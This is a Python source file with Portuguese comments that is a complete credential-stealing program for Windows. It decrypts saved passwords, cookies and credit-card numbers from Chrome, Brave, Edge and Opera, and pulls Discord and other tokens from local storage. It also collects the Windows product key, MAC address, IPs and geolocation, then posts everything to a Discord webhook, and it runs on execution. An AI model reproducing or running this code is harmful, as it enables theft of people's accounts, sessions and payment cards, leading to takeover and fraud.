import os
import re
import subprocess
from shutil import copy2
from base64 import b64decode
from json import loads
from sqlite3 import connect
import win32crypt
from Crypto.Cipher import AES
import socket
import requests
import platform
import uuid
import sqlite3
import tempfile
import psutil
import time

# Obtendo os diretórios do sistema
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

tokenPaths = {
    'Discord': rf"{roaming}\Discord",
    'Discord Canary': rf"{roaming}\discordcanary",
    'Discord PTB': rf"{roaming}\discordptb",
    'Google Chrome': rf"{local}\Google\Chrome\User Data\Default",
    'Opera': rf"{roaming}\Opera Software\Opera Stable",
    'Brave': rf"{local}\BraveSoftware\Brave-Browser\User Data\Default",
    'Yandex': rf"{local}\Yandex\YandexBrowser\User Data\Default",
    'OperaGX': rf"{roaming}\Opera Software\Opera GX Stable",
    'Steam': rf"{roaming}\Steam"
}

browser_loc = {
    "Chrome": rf"{local}\Google\Chrome",
    "Brave": rf"{local}\BraveSoftware\Brave-Browser",
    "Edge": rf"{local}\Microsoft\Edge",
    "Opera": rf"{roaming}\Opera Software\Opera Stable",
    "OperaGX": rf"{roaming}\Opera Software\Opera GX Stable",
}

# Funções para obter o caminho correto dos arquivos do navegador
def Local_State(path):
    return rf"{path}\User Data\Local State"

def Login_Data(path):
    return rf"{path}\User Data\Default\Login Data" if "Profile" not in path else rf"{path}\Login Data"

def Cookies(path):
    return rf"{path}\User Data\Default\Network\Cookies" if "Profile" not in path else rf"{path}\Network\Cookies"

# Função para obter informações do sistema
def get_system_info():
    try:
        os_info = {
            "Nome do Computador": platform.node(),
            "Sistema Operacional": platform.system() + " " + platform.release(),
            "Chave do Windows": get_windows_key(),
            "Endereço MAC": get_mac_address()
        }
        return os_info
    except Exception as e:
        return {"Erro": str(e)}

# Função para coletar o endereço MAC
def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
        return mac if mac else "Endereço MAC não encontrado."
    except Exception:
        return "Endereço MAC não encontrado."

# Função para obter a chave do Windows
def get_windows_key():
    try:
        key = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True)
        return key.strip().decode().split('\n')[1]
    except Exception:
        return "Chave do Windows não encontrada."

# Função para descriptografar token do Discord
def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return None

# Função para encerrar processos do navegador para evitar erros de permissão
def close_browser_process(browser_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == browser_name.lower():
            try:
                proc.kill()
                print(f"Processo {browser_name} encerrado.")
            except psutil.NoSuchProcess:
                pass
            except psutil.AccessDenied:
                print(f"Erro: Acesso negado ao processo {proc.info['pid']}.")

# Função ajustada para extrair tokens de várias plataformas
def get_tokens(path):
    tokens = set()
    lev_db = rf"{path}\Local Storage\leveldb"
    loc_state = rf"{path}\Local State"

    if os.path.exists(loc_state):
        print(f"Local State encontrado em: {loc_state}")
        try:
            with open(loc_state, "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                key = b64decode(key)[5:]  # Chave mestre descriptografada
                master_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception as e:
            print(f"Erro ao obter a chave mestra: {e}")
            return list(tokens)

        if os.path.exists(lev_db):
            for file_name in os.listdir(lev_db):
                if file_name.endswith((".ldb", ".log", ".sqlite")):
                    try:
                        with open(os.path.join(lev_db, file_name), "r", errors='ignore') as files:
                            for line in files.readlines():
                                line = line.strip()
                                token_match = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
                                mfa_match = re.findall(r'mfa\.[\w-]{84}', line) + re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25}', line)

                                for token in token_match:
                                    try:
                                        decrypted = decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                                        if decrypted:
                                            tokens.add(decrypted)
                                            print(f"Token padrão descriptografado: {decrypted}")
                                    except Exception as e:
                                        print(f"Erro ao descriptografar token padrão: {e}")
                                        continue

                                for token in mfa_match:
                                    tokens.add(token)
                                    print(f"Token MFA encontrado: {token}")
                    except PermissionError as e:
                        print(f"Erro de permissão ao acessar {file_name}: {e}")
                        continue
                    except Exception as e:
                        print(f"Erro ao processar {file_name}: {e}")
                        continue
        else:
            print(f"Diretório LevelDB não encontrado em: {lev_db}")
    else:
        print(f"Local State não encontrado em: {loc_state}. Tentando método sem criptografia.")

    return list(tokens)

# Função para descriptografar o conteúdo do navegador e extrair os dados
def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    message = ""
    close_browser_process(name)  # Encerra o navegador antes de tentar descriptografar

    try:
        if os.path.exists(LocalState):
            with open(LocalState) as f:
                local_state = loads(f.read())
                master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

                # Criação do arquivo temporário para Login Data
                with tempfile.NamedTemporaryFile(delete=False) as temp_login:
                    if os.path.exists(LoginData):
                        copy2(LoginData, temp_login.name)
                        with connect(temp_login.name) as conn:
                            cur = conn.cursor()
                            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                            message += f"\n{name} - Login \n"
                            for logins in cur.fetchall():
                                try:
                                    if logins[0] and logins[1] and logins[2]:
                                        ciphers = logins[2]
                                        init_vector = ciphers[3:15]
                                        enc_pass = ciphers[15:-16]

                                        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
                                        dec_pass = cipher.decrypt(enc_pass).decode()
                                        message += f"URL: {logins[0]}\nUsuário: {logins[1]}\nSenha: {dec_pass}\n"
                                except Exception as e:
                                    message += f"Erro ao descriptografar login para {logins[0]}: {str(e)}\n"
                                    continue

                # Criação do arquivo temporário para Cookies
                with tempfile.NamedTemporaryFile(delete=False) as temp_cookie:
                    if os.path.exists(CookiesFile):
                        copy2(CookiesFile, temp_cookie.name)
                        with connect(temp_cookie.name) as conn:
                            curr = conn.cursor()
                            curr.execute("SELECT host_key, name, encrypted_value, expires_utc FROM cookies")
                            message += f"\n{name} - Cookies \n"
                            for cookies in curr.fetchall():
                                try:
                                    if cookies[0] and cookies[1] and cookies[2] and "google" not in cookies[0]:
                                        ciphers = cookies[2]
                                        init_vector = ciphers[3:15]
                                        enc_pass = ciphers[15:-16]
                                        cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
                                        dec_pass = cipher.decrypt(enc_pass).decode()
                                        message += f'URL: {cookies[0]}\nNome: {cookies[1]}\nCookie: {dec_pass}\n'
                                except Exception as e:
                                    message += f"Erro ao descriptografar cookie para {cookies[0]}: {str(e)}\n"
                                    continue
    except Exception as e:
        message += f"Erro ao descriptografar dados do navegador {name}: {str(e)}\n"

    return message.strip()

# Função para extrair dados de cartão de crédito baseados em Chromium
def extrair_cartao_credito(LocalState, LoginData, browser_name):
    message = ""
    close_browser_process(browser_name)  # Encerra o navegador antes de tentar descriptografar

    try:
        if os.path.exists(LocalState):
            with open(LocalState, "r") as f:
                local_state = loads(f.read())
                encrypted_key = local_state.get("os_crypt", {}).get("encrypted_key", None)

                if not encrypted_key:
                    raise ValueError("Chave mestra criptografada não encontrada em LocalState.")

                master_key = b64decode(encrypted_key)[5:]
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

                # Criação do arquivo temporário para o Login Data
                with tempfile.NamedTemporaryFile(delete=False) as temp_card:
                    if os.path.exists(LoginData):
                        copy2(LoginData, temp_card.name)
                        with connect(temp_card.name) as conn:
                            cur = conn.cursor()
                            try:
                                cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                                message += "\nCartões de Crédito\n"

                                for card in cur.fetchall():
                                    try:
                                        if card[0] and card[1] and card[2] and card[3]:
                                            ciphers = card[3]

                                            if len(ciphers) >= 16:
                                                init_vector = ciphers[3:15]
                                                enc_pass = ciphers[15:-16]

                                                cipher = AES.new(master_key, AES.MODE_GCM, init_vector)
                                                dec_pass = cipher.decrypt(enc_pass).decode()
                                                message += f"Nome no Cartão: {card[0]}\nMês Expiração: {card[1]}\nAno Expiração: {card[2]}\nNúmero do Cartão: {dec_pass}\n"
                                            else:
                                                message += f"Valor criptografado do cartão é inválido. Tamanho insuficiente.\n"
                                    except (ValueError, KeyError, IndexError, sqlite3.Error) as e:
                                        message += f"Erro ao descriptografar cartão de crédito: {str(e)}\n"
                                        continue
                            except sqlite3.OperationalError as e:
                                message += f"Tabela credit_cards não encontrada: {str(e)}\n"
    except Exception as e:
        message += f"Erro ao descriptografar cartões de crédito: {str(e)}\n"

    return message.strip()

# Função para enviar dados ao webhook
def post_to(file_content):
    webhook_url = "URL DO WEBHOOK"  # URL do webhook do Discord

    try:
        response = requests.post(webhook_url, json={"content": file_content})
        if response.status_code in [200, 204]:
            print("Mensagem enviada com sucesso.")
        else:
            print(f"Erro ao enviar mensagem: Status {response.status_code}")
    except Exception as e:
        print(f"Erro ao enviar para o webhook: {e}")

# Função para coletar geolocalização e IPs
def extrair_info_geografica():
    try:
        response = requests.get("https://ipinfo.io/")
        data = response.json()
        geo_text = (f"Informações Geográficas:\n"
                    f"IP Público: {data['ip']}\n"
                    f"Localização: {data['city']}, {data['region']}, {data['country']}\n"
                    f"Coordenadas: {data['loc']}\n")
        return geo_text.strip()
    except Exception as e:
        return f"Erro ao obter informações geográficas: {str(e)}"

# Função para obter IP privado e público
def extrair_ips():
    hostname = socket.gethostname()
    ip_privado = socket.gethostbyname(hostname)

    ip_text = f"Informações de IP:\nIP Privado: {ip_privado}\n"
    try:
        ip_publico = requests.get('https://api.ipify.org').text
        ip_text += f"IP Público: {ip_publico}\n"
    except Exception as e:
        ip_text += f"Erro ao obter IP público: {str(e)}"
    
    return ip_text.strip()

# Função principal para consolidar as informações e enviá-las
def main():
    mensagem = ""
    mensagens_adicionais = set()

    sys_info = get_system_info()
    for key, value in sys_info.items():
        mensagem += f"{key}: {value}\n"

    tokens_info = main_tokens()
    if tokens_info:
        mensagem += tokens_info + "\n"
    else:
        mensagem += "Tokens não encontrados.\n"

    geo_info = extrair_info_geografica()
    if geo_info.strip() and geo_info.strip() not in mensagens_adicionais:
        mensagem += geo_info + "\n"
        mensagens_adicionais.add(geo_info.strip())

    ip_info = extrair_ips()
    if ip_info.strip() and ip_info.strip() not in mensagens_adicionais:
        mensagem += ip_info + "\n"
        mensagens_adicionais.add(ip_info.strip())

    cartao_info = ""
    for name, path in browser_loc.items():
        browser_data = decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), name)
        if browser_data.strip() and browser_data.strip() not in mensagens_adicionais:
            mensagem += browser_data
            mensagens_adicionais.add(browser_data.strip())
        else:
            mensagem += f"Nenhum dado encontrado para o navegador {name}.\n"

        cartao_info += extrair_cartao_credito(Local_State(path), Login_Data(path), name) + ""

    if cartao_info.strip():
        mensagem += cartao_info.strip()
    else:
        mensagem += "Nenhum cartão de crédito encontrado.\n"

    post_to(mensagem.strip())

def main_tokens():
    mensagem_tokens = ""
    for platform, path in tokenPaths.items():
        if os.path.exists(path):
            tokens = get_tokens(path)
            if tokens:
                mensagem_tokens += f"\nTokens {platform}:\n" + "\n".join(tokens) + "\n"
            else:
                mensagem_tokens += f"\nNenhum token encontrado para {platform}."
        else:
            mensagem_tokens += f"\nCaminho não encontrado para {platform}."
    return mensagem_tokens.strip()

main()
